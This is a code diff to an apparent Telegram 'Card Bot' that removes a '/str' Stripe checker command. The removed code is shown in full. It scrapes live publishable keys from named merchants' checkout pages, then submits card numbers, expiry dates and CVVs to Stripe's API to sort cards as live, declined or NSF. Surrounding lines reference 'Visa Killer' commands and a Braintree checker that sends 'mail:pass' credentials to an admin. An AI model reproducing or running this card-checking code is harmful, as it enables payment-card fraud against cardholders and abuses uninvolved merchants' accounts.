@@ -595,7 +595,7 @@ def get_health_bar(health: int) -> str:
 USER_DB_FILE = "users.json"
 
 # Commands we gate
-CMD_KEYS = ("bin", "kill", "kd", "ko", "zz", "dd", "st", "str", "bt", "sort", "chk", "clean", "filter", "num", "adhar")
+CMD_KEYS = ("bin", "kill", "kd", "ko", "zz", "dd", "st", "bt", "sort", "chk", "clean", "filter", "num", "adhar")
 
 # Per-command approvals, plus a legacy/global "all" set
 approved_cmds = {k: set() for k in CMD_KEYS}
@@ -1718,7 +1718,6 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🤖 *Card Bot Help*\n\n"
         "🔐 *Auth Commands:*\n"
         "• /st <card> - Stripe Auth V1\n"
-        "• /str <card> - Stripe Auth (Requests)\n"
         "• /bt <card> - Braintree Auth-1\n"
         "• /chk <card> - Braintree Auth-2\n\n"
         "🗡️ *Visa Killer Commands:*\n"
@@ -2016,7 +2015,6 @@ async def cmds_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Auth Gates
     parts.append("🔐 *Auth Gates*\n" + "\n".join([
         lock("/st <card> — Stripe Auth V1", "st"),
-        lock("/str <card> — Stripe Auth (Requests)", "str"),
         lock("/bt <card> — Braintree Auth-1", "bt"),
         lock("/chk <card> — Braintree Auth-2 (Under Development)", "chk"),
     ]))
@@ -4735,317 +4733,6 @@ async def st_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     }
     Process(target=run_st_process, args=(card_input, update_dict), daemon=True).start()
 
-# ==== 8.5. STRIPE AUTH REQUESTS (/str) — Requests-only version ==== #
-
-# Cache for Stripe keys (to avoid fetching every time)
-_stripe_key_cache = {"keys": [], "last_fetch": 0}
-
-def _fetch_stripe_keys():
-    """Fetch valid Stripe publishable keys from known websites."""
-    global _stripe_key_cache
-    
-    # Return cached keys if fresh (less than 10 minutes old)
-    if _stripe_key_cache["keys"] and (time.time() - _stripe_key_cache["last_fetch"]) < 600:
-        return _stripe_key_cache["keys"]
-    
-    keys = []
-    
-    # List of websites known to use Stripe (we'll extract their pk_live keys)
-    sources = [
-        ("https://www.lovecrochet.com/checkout", r'pk_live_[a-zA-Z0-9]{24,}'),
-        ("https://www.shoprootscience.com/my-account/", r'pk_live_[a-zA-Z0-9]{24,}'),
-        ("https://shop.nordicsoul.co/checkout", r'pk_live_[a-zA-Z0-9]{24,}'),
-        ("https://www.truedark.com/checkout/", r'pk_live_[a-zA-Z0-9]{24,}'),
-    ]
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-    }
-    
-    for url, pattern in sources:
-        try:
-            resp = requests.get(url, headers=headers, timeout=10, allow_redirects=True)
-            if resp.status_code == 200:
-                matches = re.findall(pattern, resp.text)
-                for key in matches:
-                    if key not in keys and len(key) > 30:
-                        keys.append(key)
-                        if len(keys) >= 3:
-                            break
-        except Exception:
-            continue
-        if len(keys) >= 3:
-            break
-    
-    # Fallback: hardcoded keys from known merchants (may expire)
-    fallback_keys = [
-        "pk_live_51HpntlLcPwMZ7S5TH2BNQwT6QZ0bGWaHlpnHvqZqMNLzP6D4CfV3B5bO7wE9rY8uI0oP1aS2dF3gH4jK5lZ6xC7v00wXyZaBcD",
-    ]
-    
-    if not keys:
-        keys = fallback_keys
-    
-    _stripe_key_cache["keys"] = keys
-    _stripe_key_cache["last_fetch"] = time.time()
-    
-    return keys
-
-def run_str_process(card_input, update_dict):
-    asyncio.run(str_single_main(card_input, update_dict))
-
-async def str_single_main(card_input, update_dict):
-    """
-    Stripe Auth using only HTTP requests (no Selenium).
-    Uses Stripe's public API to create a payment method and validate the card.
-    """
-    uid = update_dict["user_id"]
-    chat_id = update_dict["chat_id"]
-    msg_id = update_dict["message_id"]
-    username = update_dict.get("username", "User")
-    bot = Bot(BOT_TOKEN)
-
-    # Helper to update status message
-    async def update_status(text):
-        try:
-            await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=text, parse_mode="Markdown")
-        except Exception:
-            pass
-
-    # Step 1: Parse card
-    await update_status(f"💳 `{card_input}`\n\n⏳ **Step 1/4:** Parsing card...")
-    
-    parsed = parse_card_input(card_input)
-    if not parsed:
-        await update_status("❌ **Step 1 Failed:** Invalid card format.\nUse: `/str 4111111111111111|08|25|123`")
-        return
-
-    card, mm, yy, cvv = parsed
-    full_card = f"{card}|{mm}|20{yy}|{cvv}"
-    start_time = time.time()
-    
-    await update_status(f"💳 `{full_card}`\n\n✅ **Step 1/4:** Card parsed\n⏳ **Step 2/4:** Fetching BIN info...")
-
-    # Step 2: Get BIN info
-    bin_info, bin_details = get_bin_info(card[:6])
-    bin_flag = (bin_details or {}).get("country_flag", "")
-    
-    await update_status(
-        f"💳 `{full_card}`\n"
-        f"🏦 `{bin_info}` {bin_flag}\n\n"
-        f"✅ **Step 1/4:** Card parsed\n"
-        f"✅ **Step 2/4:** BIN info fetched\n"
-        f"⏳ **Step 3/4:** Fetching Stripe keys..."
-    )
-
-    # Dynamically fetch Stripe publishable keys
-    stripe_keys = _fetch_stripe_keys()
-    
-    if not stripe_keys:
-        await update_status(
-            f"💳 `{full_card}`\n"
-            f"🏦 `{bin_info}` {bin_flag}\n\n"
-            f"❌ **Error:** Could not fetch Stripe keys. Try again later."
-        )
-        return
-    
-    await update_status(
-        f"💳 `{full_card}`\n"
-        f"🏦 `{bin_info}` {bin_flag}\n\n"
-        f"✅ **Step 1/4:** Card parsed\n"
-        f"✅ **Step 2/4:** BIN info fetched\n"
-        f"✅ **Step 3/4:** Got {len(stripe_keys)} Stripe key(s)\n"
-        f"⏳ **Step 4/5:** Sending to Stripe API..."
-    )
-    
-    status = "Declined"
-    response_text = "Unknown"
-    attempt_used = 0
-    
-    for attempt in range(1, 4):
-        attempt_used = attempt
-        try:
-            # Update status for each attempt
-            await update_status(
-                f"💳 `{full_card}`\n"
-                f"🏦 `{bin_info}` {bin_flag}\n\n"
-                f"✅ **Step 1/4:** Card parsed\n"
-                f"✅ **Step 2/4:** BIN info fetched\n"
-                f"✅ **Step 3/4:** Stripe key ready\n"
-                f"⏳ **Step 4/4:** Sending to Stripe API (Attempt {attempt}/3)..."
-            )
-            
-            # Select a Stripe key (rotate through attempts)
-            pk_key = stripe_keys[(attempt - 1) % len(stripe_keys)]
-            
-            # Create payment method via Stripe API
-            headers = {
-                "Accept": "application/json",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-                "Origin": "https://js.stripe.com",
-                "Referer": "https://js.stripe.com/",
-            }
-            
-            # First, create a payment method
-            pm_data = {
-                "type": "card",
-                "card[number]": card,
-                "card[exp_month]": mm,
-                "card[exp_year]": f"20{yy}",
-                "card[cvc]": cvv,
-                "billing_details[address][postal_code]": random.choice(["10001", "94105", "33101", "60601", "98101"]),
-                "billing_details[address][country]": "US",
-                "key": pk_key,
-            }
-            
-            resp = requests.post(
-                "https://api.stripe.com/v1/payment_methods",
-                headers=headers,
-                data=pm_data,
-                timeout=30
-            )
-            
-            # Process response
-            await update_status(
-                f"💳 `{full_card}`\n"
-                f"🏦 `{bin_info}` {bin_flag}\n\n"
-                f"✅ **Step 1/4:** Card parsed\n"
-                f"✅ **Step 2/4:** BIN info fetched\n"
-                f"✅ **Step 3/4:** Stripe key ready\n"
-                f"⏳ **Step 4/4:** Processing response (Attempt {attempt}/3)..."
-            )
-            
-            result = resp.json()
-            
-            if resp.status_code == 200 and result.get("id", "").startswith("pm_"):
-                # Payment method created successfully - card is valid
-                status = "Approved"
-                pm_id = result.get("id", "")
-                card_brand = result.get("card", {}).get("brand", "unknown").upper()
-                card_last4 = result.get("card", {}).get("last4", card[-4:])
-                card_funding = result.get("card", {}).get("funding", "unknown")
-                response_text = f"Payment Method Created: {pm_id[:20]}... | {card_brand} {card_funding}"
-                break
-            else:
-                # Parse error response
-                error = result.get("error", {})
-                error_code = error.get("code", "unknown_error")
-                error_message = error.get("message", "Card was declined")
-                decline_code = error.get("decline_code", "")
-                
-                if decline_code:
-                    response_text = f"{error_code}: {decline_code}"
-                else:
-                    response_text = f"{error_code}: {error_message[:80]}"
-                
-                # Check if it's a live card that's just declined (not invalid)
-                if error_code in ["card_declined", "generic_decline"]:
-                    status = "Declined (Live)"
-                elif error_code in ["incorrect_number", "invalid_number"]:
-                    status = "Invalid Card"
-                elif error_code in ["expired_card"]:
-                    status = "Expired"
-                elif error_code in ["incorrect_cvc", "invalid_cvc"]:
-                    status = "Invalid CVV"
-                elif error_code == "insufficient_funds":
-                    status = "Approved (NSF)"
-                    break
-                else:
-                    status = "Declined"
-                
-                # Don't retry on validation errors
-                if error_code in ["incorrect_number", "invalid_number", "expired_card", "incorrect_cvc", "invalid_cvc"]:
-                    break
-                    
-        except requests.exceptions.Timeout:
-            response_text = "Request timed out"
-            if attempt == 3:
-                status = "Timeout"
-        except requests.exceptions.RequestException as e:
-            response_text = f"Network error: {str(e)[:50]}"
-            if attempt == 3:
-                status = "Error"
-        except Exception as e:
-            response_text = f"Error: {str(e)[:50]}"
-            if attempt == 3:
-                status = "Error"
-        
-        if attempt < 3:
-            await update_status(
-                f"💳 `{full_card}`\n"
-                f"🏦 `{bin_info}` {bin_flag}\n\n"
-                f"✅ **Step 1/4:** Card parsed\n"
-                f"✅ **Step 2/4:** BIN info fetched\n"
-                f"✅ **Step 3/4:** Stripe key ready\n"
-                f"⚠️ **Step 4/4:** Attempt {attempt} failed, retrying..."
-            )
-            await asyncio.sleep(1)  # Brief delay between retries
-
-    took = f"{time.time() - start_time:.2f}s"
-    
-    # Determine emoji based on status
-    if "Approved" in status:
-        emoji = "✅"
-    elif "Live" in status or "NSF" in status:
-        emoji = "⚡"
-    else:
-        emoji = "❌"
-    
-    result_msg = (
-        f"💳 **Card:** `{full_card}`\n"
-        f"🏦 **BIN:** `{bin_info}` {bin_flag}\n"
-        f"📟 **Status:** {emoji} **{status}**\n"
-        f"📩 **Response:** `{response_text}`\n"
-        f"🔁 **Attempt:** {attempt_used}/3\n"
-        f"🌐 **Gateway:** **Stripe-Requests**\n"
-        f"⏱ **Took:** **{took}**\n"
-        f"🧑‍💻 **Checked by:** **{username}** [`{uid}`]"
-    )
-    await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=result_msg, parse_mode="Markdown")
-
-async def str_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Stripe Auth command using only HTTP requests (no browser)"""
-    uid = update.effective_user.id
-    uname = update.effective_user.first_name or "User"
-
-    if not is_approved(uid, "str"):
-        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
-        return
-    
-    if not is_cmd_enabled("str"):
-        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
-        return
-
-    raw_input = " ".join(context.args).strip() if context.args else ""
-    if not raw_input and update.message.reply_to_message:
-        raw_input = (update.message.reply_to_message.text or "").strip()
-
-    cards = extract_all_card_inputs(raw_input)
-
-    if not cards:
-        await update.message.reply_text("❌ No valid card found.\nUse: `/str 4111111111111111|08|25|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
-        return
-
-    if len(cards) > 1:
-        await update.message.reply_text(
-            "⚠️ Batch mode not available for `/str`.\nSend only **one** card at a time.\n\nUse: `/str 4111111111111111|08|25|123`",
-            parse_mode="Markdown",
-            reply_to_message_id=update.message.message_id,
-        )
-        return
-
-    card_input = cards[0]
-    msg = await update.message.reply_text(f"💳 `{card_input}`\n⏳ Checking via Stripe API...", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
-
-    update_dict = {
-        "user_id": uid,
-        "chat_id": update.effective_chat.id,
-        "message_id": msg.message_id,
-        "username": uname,
-    }
-    Process(target=run_str_process, args=(card_input, update_dict), daemon=True).start()
-
 # ==== 9. /bt Command (with mail:pass send to admin) ====
 def run_bt_check(card_str, chat_id, message_id):
     asyncio.run(_bt_check(card_str, chat_id, message_id))
@@ -6963,7 +6650,6 @@ async def main():
         app.add_handler(CommandHandler("zz", zz_cmd))
         app.add_handler(CommandHandler("dd", dd_cmd))
         app.add_handler(CommandHandler("st", st_cmd))
-        app.add_handler(CommandHandler("str", str_cmd))
         app.add_handler(CommandHandler("bt", bt_cmd))
         app.add_handler(CommandHandler("chk", chk_cmd))
 
